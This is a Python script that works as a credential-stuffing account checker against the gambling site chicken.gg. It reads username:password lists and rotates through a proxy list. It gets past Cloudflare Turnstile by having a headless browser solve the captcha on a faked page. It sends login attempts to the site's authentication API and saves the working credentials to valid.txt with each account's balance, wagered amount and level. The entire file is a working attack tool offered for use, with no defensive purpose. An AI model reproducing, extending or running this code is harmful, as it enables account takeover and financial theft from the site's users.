import sys
import time
import json
import requests
import threading
import random
import itertools
import asyncio
import os
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from camoufox import DefaultAddons
from camoufox.async_api import AsyncCamoufox

R = '\033[0m'
B = '\033[1m'
DM = '\033[2m'
GR = '\033[92m'
RD = '\033[91m'
AM = '\033[93m'
CY = '\033[96m'
WH = '\033[97m'
MU = '\033[90m'

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

XP_THRESHOLDS = [
    0, 10, 21, 33, 46, 60, 75, 91, 108, 126, 145, 166, 189, 214, 241, 270,
    302, 337, 375, 417, 463, 514, 570, 632, 700, 775, 858, 950, 1052, 1165,
    1290, 1428, 1581, 1750, 1937, 2144, 2373, 2627, 2908, 3219, 3564, 3936,
    4337, 4770, 5237, 5741, 6285, 6872, 7505, 8188, 8925, 9720, 10578, 11504,
    12504, 13584, 14750, 16009, 17368, 18835, 20419, 22129, 23975, 25968,
    28120, 30444, 32953, 35662, 38587, 41746, 45157, 48840, 52817, 57112,
    61750, 66759, 72168, 78009, 84317, 91129, 98485, 106172, 114204, 122597,
    131367, 140531, 150107, 160113, 170569, 181495, 192912, 204842, 217308,
    230334, 243946, 258170, 273034, 288566, 304796, 321756, 339479, 357999,
    377352, 397575, 418708, 440791, 463867, 487981, 513180, 539512, 567028,
    595782, 625829, 657228, 690039, 724326, 760155, 797596, 836721, 877606,
    920330, 964122, 1009008, 1055016, 1102174, 1150510, 1200054, 1250836,
    1302887, 1356239, 1410924, 1466976, 1524429, 1583318, 1643679, 1705549,
    1768965, 1833966, 1900592, 1968883, 2038881, 2110628, 2184168, 2259546,
    2336808, 2416001, 2497173, 2580374, 2665655, 2753068, 2842666, 2934503,
    3028635, 3125120, 3224017, 3325386, 3429289, 3535789, 3644951, 3756842,
    3871530, 3987938, 4106092, 4226018, 4347742, 4471291, 4596693, 4723976,
    4853168, 4984297, 5117392, 5252483, 5389600, 5528773, 5670033, 5813411,
    5958939, 6106649, 6256574, 6408747, 6563202, 6719973, 6879095, 7040603,
    7204533, 7370921, 7539804, 7711220, 7885207, 8061803, 8241047, 8422979,
    8607639, 8795068, 8985308, 9178401, 9374390, 9573318, 9775229, 9980168,
    10188181, 10397026, 10606706, 10817224, 11028584, 11240789, 11453842,
    11667747, 11882507, 12098126, 12314607, 12531953, 12750168, 12969255,
    13189218, 13410060, 13631785, 13854396, 14077897, 14302292, 14527584,
    14753777, 14980874, 15208879, 15437796, 15667628, 15898379, 16130053,
    16362653, 16596183, 16830647, 17066048, 17302390, 17539677, 17777913,
    18017101, 18257245, 18498349, 18740417, 18983453, 19227461, 19472079,
    19717308, 19963150, 20209606, 20456678, 20704367, 20952675, 21201603,
    21451153, 21701326, 21952124, 22203548, 22455600, 22708282, 22961595,
    23215541, 23470121, 23725337, 23981191, 24237684, 24494818, 24752594,
    25011014, 25270080, 25529793, 25790155, 26051167, 26312831, 26575149,
    26838122, 27101752, 27366041, 27630990, 27896601, 28162876, 28429816,
    28697423, 28965699, 29234645, 29504263, 29774555, 30045522, 30317166,
    30589489, 30862492, 31136177, 31410546, 31685600, 31961341, 32237771,
    32514892, 32792705, 33071212, 33350415, 33630316, 33910916, 34192217,
    34474221, 34756930, 35040345, 1000000000
]

def xp_to_level(xp: int) -> int:
    level_xp = xp // 1000000
    for i, threshold in enumerate(XP_THRESHOLDS):
        if level_xp < threshold:
            return i - 1
    return len(XP_THRESHOLDS) - 1

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "Origin": "https://chicken.gg",
    "Referer": "https://chicken.gg/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}

class CaptchaSolver:
    def __init__(self, slots):
        self.slots = slots
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._start_loop, daemon=True)
        self.thread.start()
        self.page_pool = asyncio.Queue()
        self.browser = None
        self.camoufox = None
        asyncio.run_coroutine_threadsafe(self._init_browser(), self.loop).result()

    def _start_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    async def _init_browser(self):
        self.camoufox = AsyncCamoufox(
            headless=True,
            exclude_addons=[DefaultAddons.UBO],
            args=["--no-sandbox", "--disable-setuid-sandbox"]
        )
        self.browser = await self.camoufox.start()
        for _ in range(self.slots):
            context = await self.browser.new_context()
            page = await context.new_page()
            await self.page_pool.put((page, context))

    def get_token(self, url, sitekey):
        future = asyncio.run_coroutine_threadsafe(self._solve(url, sitekey), self.loop)
        return future.result()

    async def _solve(self, url, sitekey):
        page, context = await self.page_pool.get()
        url_with_slash = url if url.endswith("/") else url + "/"
        turnstile_div = f'<div class="cf-turnstile" data-sitekey="{sitekey}"></div>'
        page_data = f'<!DOCTYPE html><html><head><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script></head><body>{turnstile_div}</body></html>'
        
        await page.route(url_with_slash, lambda route: route.fulfill(body=page_data, status=200))
        try:
            await page.goto(url_with_slash)
            await page.eval_on_selector("//div[@class='cf-turnstile']", "el => el.style.width = '70px'")
            
            for attempt in range(30):
                try:
                    val = await page.input_value("[name=cf-turnstile-response]", timeout=400)
                    if val == "":
                        await page.locator("//div[@class='cf-turnstile']").click(timeout=400)
                        await asyncio.sleep(0.2)
                    else:
                        return val
                except Exception:
                    pass
            return None
        except Exception:
            return None
        finally:
            try:
                await page.unroute(url_with_slash)
            except Exception:
                pass
            await self.page_pool.put((page, context))

    def stop(self):
        if not self.loop or not self.loop.is_running():
            return
            
        async def shutdown():
            tasks = [t for t in asyncio.all_tasks(self.loop) if t is not asyncio.current_task(self.loop)]
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            if self.camoufox:
                try:
                    await asyncio.wait_for(self.camoufox.stop(), timeout=15)
                except asyncio.TimeoutError:
                    print(f"\n  {AM}[!]{R} {WH}Browser shutdown timed out. Orphaned processes may require manual termination.{R}")
                except Exception:
                    pass

        try:
            future = asyncio.run_coroutine_threadsafe(shutdown(), self.loop)
            future.result(timeout=20)
        except Exception:
            pass
            
        self.loop.call_soon_threadsafe(self.loop.stop)

class UI:
    def __init__(self, total):
        self.total = total
        self.done = 0
        self.valid = 0
        self.invalid = 0
        self.errors = 0
        self.queue = 0
        self.lock = threading.Lock()
        self.stop = False
        self.spinner = itertools.cycle(['|', '/', '-', '\\'])

    def update_queue(self, q):
        with self.lock:
            self.queue = max(0, self.queue + q)
            
    def record_result(self, v=0, i=0, e=0):
        with self.lock:
            self.done += 1
            self.valid += v
            self.invalid += i
            self.errors += e
            
    def log(self, text):
        with self.lock:
            sys.stdout.write(f"\r{' ' * 80}\r")
            sys.stdout.write(text + "\n")
            sys.stdout.flush()
            
    def draw(self):
        while not self.stop:
            with self.lock:
                spin = next(self.spinner)
                pct = self.done / self.total if self.total > 0 else 0
                filled = int(30 * pct)
                empty = 30 - filled
                
                bar = f"{MU}▐{GR}{'█' * filled}{MU}{'░' * empty}▌{R}"
                stats = f"{WH}{self.done}{MU}/{WH}{self.total}{R}  "
                stats += f"{GR}+{self.valid}{R}  "
                stats += f"{RD}-{self.invalid}{R}  "
                stats += f"{AM}!{self.errors}{R}  "
                stats += f"{CY}cap:{self.queue}{R} "
                
                line = f"\r{GR}{spin}{R} {bar} {stats}"
                sys.stdout.write(line + "  " * 20)
                sys.stdout.flush()
            time.sleep(0.1)

def log_valid(ui, username, bal, wag, lvl, t):
    text = f"\r{GR}+{R} {B}{WH}{username:<22}{R} {MU}bal={R}{WH}{bal:>8.2f}{R} {MU}wag={R}{WH}{wag:>10.2f}{R} {MU}lvl={R}{WH}{lvl:>3d}{R} {DM}[{t:.1f}s]{R}"
    ui.log(text)

def log_invalid(ui, username, reason):
    text = f"\r{RD}-{R} {RD}{username:<22}{R} {MU}{reason}{R}"
    ui.log(text)

def log_error(ui, username, err):
    err_short = err[:30]
    text = f"\r{AM}!{R} {AM}{username:<22}{R} {MU}error{R} {DM}({err_short}){R}"
    ui.log(text)

def get_input(label, default=None, cast=str):
    while True:
        try:
            if default is not None:
                val = input(f"  {MU}{label}{R} {DM}(default {default}) >{R} ").strip()
                if not val: return default
            else:
                val = input(f"  {MU}{label}{R} {DM}>{R} ").strip()
                if not val:
                    print(f"  {RD}no input given{R}")
                    continue
            
            if cast == int:
                return int(float(val))
            return cast(val)
        except ValueError:
            print(f"  {RD}invalid input{R}")

def setup():
    print(f"  {MU}accounts file{R} {DM}>{R} ", end="")
    acc_file = input().strip()
    if not acc_file:
        print(f"  {RD}no file given, exiting{R}")
        sys.exit(1)
    path = Path(acc_file)
    if not path.exists():
        print(f"  {RD}not found:{R} {WH}{acc_file}{R}")
        sys.exit(1)
        
    threads = get_input("threads", 24, int)
    slots = get_input("solver slots", 24, int)

    if slots > 24:
        print(f"  {AM}[!]{R} {WH}{slots}{R}{AM} solver slots may crash your system. 16GB+ RAM recommended above 24.{R}")
        cont = input(f"  {MU}continue?{R} {DM}(y/n) >{R} ").strip().lower()
        if cont != 'y': sys.exit(0)

    retries = get_input("retries (0 for unlimited)", 5, int)
    if retries == 0:
        print(f"  {MU}retries set to:{R} {WH}unlimited{R}")

    return path, threads, slots, retries

def load_proxies():
    p_path = Path("proxies.txt")
    if not p_path.exists():
        print(f"  {RD}✗ proxies.txt not found. Proxies are required.{R}")
        sys.exit(1)
    raw_proxies = []
    with open(p_path, "r", encoding="utf-8") as f:
        raw_proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        
    if not raw_proxies:
        print(f"  {RD}✗ proxies.txt is empty. Proxies are required.{R}")
        sys.exit(1)
        
    proxies = []
    for raw in raw_proxies:
        if "://" in raw:
            proxies.append(raw)
        else:
            parts = raw.split(":")
            if len(parts) == 4:
                host, port, user, pwd = parts
                proxies.append(f"http://{user}:{pwd}@{host}:{port}")
            elif len(parts) == 2:
                host, port = parts
                proxies.append(f"http://{host}:{port}")
            else:
                proxies.append(f"http://{raw}")
                
    return proxies

def print_summary(total, threads, retries):
    r_str = "unlimited" if retries == 0 else str(retries)
    print(f"  {B}{WH}{total}{R} {MU}accounts{R} {DM}|{R} {B}{WH}{threads}{R} {MU}threads{R} {DM}|{R} {MU}retries:{R} {B}{WH}{r_str}{R}")

def get_captcha_token(solver, ui):
    ui.update_queue(1)
    try:
        while True:
            token = solver.get_token("https://chicken.gg/", "0x4AAAAAACLKbvdelI6CPFSi")
            if token:
                return token
            time.sleep(0.1)
    finally:
        ui.update_queue(-1)

def try_login(username, password, captcha_token, proxy_dict):
    payload = {"username": username, "password": password, "captchaToken": captcha_token}
    try:
        resp = requests.post("https://api.chicken.gg/site/auth/local", json=payload, headers=HEADERS, proxies=proxy_dict, timeout=30)
    except requests.RequestException as e:
        return {"success": False, "error": str(e), "retryable": True}
        
    try: 
        body = resp.json()
        if not isinstance(body, dict):
            return {"success": False, "error": f"Unexpected JSON type: {type(body).__name__}", "retryable": True}
    except Exception:
        return {"success": False, "error": f"Bad JSON: {resp.text[:200]}", "retryable": True}

    if resp.status_code == 200 and "user" in body:
        user = body["user"]
        balance = (user.get("tokenBalance", 0) or 0) / 1000000
        xp = user.get("xp", 0) or 0
        stats = user.get("stats", {})
        wagered = (stats.get("wagerAmount", 0) or 0) / 1000000
        level = xp_to_level(xp)
        
        offer_case_amount = (stats.get("offerCaseAmount", 0) or 0) / 1000000
        quick = offer_case_amount * 0.0025
        daily = offer_case_amount * 0.02
        weekly = offer_case_amount * 0.10
        monthly = offer_case_amount * 0.25
        rankup = offer_case_amount * 0.15 if level >= 30 and level % 10 == 0 else 0.0
        
        return {
            "success": True, 
            "balance": balance, 
            "wagered": wagered, 
            "level": level, 
            "quick": quick,
            "daily": daily,
            "weekly": weekly,
            "monthly": monthly,
            "rankup": rankup,
            "retryable": False
        }
        
    error = body.get("error", "")
    retryable = True
    if "user not found" in error.lower(): retryable = False
    elif "invalid password" in error.lower(): retryable = False
    
    return {"success": False, "error": error or f"HTTP {resp.status_code}", "retryable": retryable}

def check_account(args, ui, solver, proxy_cycle, output_lock, max_retries):
    idx, total, username, password = args
    start_t = time.time()
    attempt = 1
    while True:
        if max_retries > 0 and attempt > max_retries:
            log_error(ui, username, "max retries")
            ui.record_result(e=1)
            return
            
        captcha = get_captcha_token(solver, ui)
        
        proxy = next(proxy_cycle)
        proxy_dict = {"http": proxy, "https": proxy}
            
        result = try_login(username, password, captcha, proxy_dict)
        
        if result["success"]:
            t = time.time() - start_t
            log_valid(ui, username, result["balance"], result["wagered"], result["level"], t)
            line = f"{username}:{password} | Balance = {result['balance']:.2f} | Wagered = {result['wagered']:.2f} | Level = {result['level']} | Quick = {result['quick']:.4f} | Daily = {result['daily']:.4f} | Weekly = {result['weekly']:.4f} | Monthly = {result['monthly']:.4f} | RankUp = {result['rankup']:.4f}"
            with output_lock:
                with open("valid.txt", "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            ui.record_result(v=1)
            return
        elif not result["retryable"]:
            err = result["error"]
            reason = "not found" if "not found" in err.lower() else "bad password"
            log_invalid(ui, username, reason)
            ui.record_result(i=1)
            return
        else:
            attempt += 1

def final_summary(ui):
    print(f"  {GR}{B}✓{R} done {DM}|{R} {GR}{B}+{ui.valid}{R} {MU}valid{R} {DM}|{R} {RD}-{ui.invalid}{R} {MU}invalid{R} {DM}|{R} {AM}!{ui.errors}{R} {MU}errors{R} {DM}|{R} {CY}-> valid.txt{R}")

def main():
    solver = None
    try:
        acc_path, threads, slots, retries = setup()
        proxies = load_proxies()
        proxy_cycle = itertools.cycle(proxies)
        
        print(f"  {MU}·{R} starting solver {DM}({slots} slots){R}")
        solver = CaptchaSolver(slots)
        print(f"  {GR}✓{R} solver ready{' ' * 20}")
        
        accounts = []
        with open(acc_path, "r", encoding="utf-8-sig") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"): continue
                if ":" in line:
                    u, p = line.split(":", 1)
                    u, p = u.strip(), p.strip()
                    if u and p:
                        accounts.append((u, p))
                    
        total = len(accounts)

        print_summary(total, threads, retries)

        ui = UI(total)
        draw_thread = threading.Thread(target=ui.draw, daemon=True)
        draw_thread.start()

        output_lock = threading.Lock()
        tasks = [(i + 1, total, u, p) for i, (u, p) in enumerate(accounts)]

        executor = ThreadPoolExecutor(max_workers=threads)
        try:
            futures = [executor.submit(check_account, t, ui, solver, proxy_cycle, output_lock, retries) for t in tasks]
            for future in as_completed(futures):
                try: 
                    future.result()
                except Exception:
                    ui.record_result(e=1)
        except KeyboardInterrupt:
            print(f"\n  {RD}Ctrl+C detected, shutting down...{R}")
            executor.shutdown(wait=False, cancel_futures=True)
            ui.stop = True
            time.sleep(0.2)
            sys.stdout.write(f"\r{' ' * 80}\r")
            final_summary(ui)
            return
    finally:
        if solver:
            solver.stop()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {RD}Ctrl+C detected during setup, exiting...{R}")
    finally:
        sys.stdout.flush()
        os._exit(0)
